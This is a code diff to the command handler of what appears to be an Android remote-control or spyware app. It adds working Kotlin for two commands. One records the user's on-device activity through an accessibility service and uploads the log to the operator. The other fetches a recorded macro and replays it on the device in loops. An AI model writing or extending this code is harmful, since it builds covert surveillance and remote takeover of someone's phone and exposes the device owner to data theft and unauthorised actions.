@@ -12,6 +12,7 @@ import com.systemlinker.features.events.TriggerManager
 import com.systemlinker.features.call.VoipManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import org.json.JSONObject
@@ -47,6 +48,98 @@ class CommandProcessor(
             try {
                 when (cmd) {
                     
+                    "track_activity" -> {
+                        val parts = arg.split(",").map { it.trim() }
+                        val duration = parts.getOrNull(0)?.toLongOrNull() ?: 10L
+                        val taskName = parts.getOrNull(1) ?: ""
+
+                        uploader.sendText("🔴 Macro Activity Tracking started for $duration seconds...")
+                        val intent = Intent("com.systemlinker.ACC_ACTION").apply {
+                            setPackage(context.packageName)
+                            putExtra("action", "start_macro_track")
+                        }
+                        context.sendBroadcast(intent)
+
+                        delay(duration * 1000L)
+
+                        val trackFile = suspendCancellableCoroutine<File?> { cont ->
+                            val receiver = object : BroadcastReceiver() {
+                                override fun onReceive(c: Context?, intent: Intent?) {
+                                    if (intent?.action == "com.systemlinker.MACRO_RESULT") {
+                                        context.unregisterReceiver(this)
+                                        val path = intent.getStringExtra("path")
+                                        if (path != null) cont.resume(File(path)) else cont.resume(null)
+                                    }
+                                }
+                            }
+                            val filter = IntentFilter("com.systemlinker.MACRO_RESULT")
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                                context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
+                            } else {
+                                context.registerReceiver(receiver, filter)
+                            }
+
+                            val stopIntent = Intent("com.systemlinker.ACC_ACTION").apply {
+                                setPackage(context.packageName)
+                                putExtra("action", "stop_macro_track")
+                            }
+                            context.sendBroadcast(stopIntent)
+                        }
+
+                        if (trackFile != null && trackFile.exists()) {
+                            if (taskName.isNotEmpty()) {
+                                val vault = VaultManager(context)
+                                vault.saveWorkflow(taskName, "macro", "", trackFile.readText())
+                                uploader.sendText("✅ Tracking saved to DB as: $taskName")
+                            }
+                            uploader.sendDocument(trackFile, "Macro Track: ${taskName.ifEmpty { "Temp Session" }}", deleteAfter = true)
+                        } else {
+                            uploader.sendText("❌ Tracking failed to generate log.")
+                        }
+                    }
+
+                    "perform" -> {
+                        val parts = arg.split(",").map { it.trim() }
+                        val lag = parts.getOrNull(0)?.toLongOrNull() ?: 0L
+                        val loops = parts.getOrNull(1)?.toIntOrNull() ?: 1
+                        val taskName = parts.getOrNull(2) ?: ""
+
+                        val vault = VaultManager(context)
+                        var macroContent = if (taskName.isNotEmpty()) vault.getWorkflow(taskName) else null
+
+                        if (macroContent == null) {
+                            uploader.sendText("⏳ Polling for 30s. Please send the Macro Track file (.txt)...")
+                            val destFile = File(context.cacheDir, "temp_macro.txt")
+                            val success = uploader.pollForFile(30, "document", destFile)
+                            if (success) {
+                                macroContent = destFile.readText()
+                                if (taskName.isNotEmpty()) {
+                                    vault.saveWorkflow(taskName, "macro", "", macroContent)
+                                    uploader.sendText("✅ Received macro saved permanently to DB as: $taskName")
+                                }
+                                destFile.delete()
+                            } else {
+                                uploader.sendText("❌ Timeout. No macro file received.")
+                                return@launch
+                            }
+                        }
+
+                        if (macroContent != null) {
+                            if (lag > 0) {
+                                uploader.sendText("⏳ Lag interval: Waiting $lag seconds before execution...")
+                                delay(lag * 1000L)
+                            }
+                            uploader.sendText("▶️ Executing macro: ${taskName.ifEmpty { "Polled File" }} (Loops: $loops)")
+                            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
+                                setPackage(context.packageName)
+                                putExtra("action", "play_macro")
+                                putExtra("macro_content", macroContent)
+                                putExtra("loops", loops)
+                            }
+                            context.sendBroadcast(intent)
+                        }
+                    }
+
                     "call" -> {
                         val parts = arg.split(",").map { it.trim() }
                         if (parts.size >= 2) {
@@ -89,8 +182,6 @@ class CommandProcessor(
                             uploader.sendText("No active call to terminate.")
                         }
                     }
-
-                    // ... (All other commands remain exactly as they were) ...
                     
                     "help" -> {
                         val type = arg.trim().lowercase()
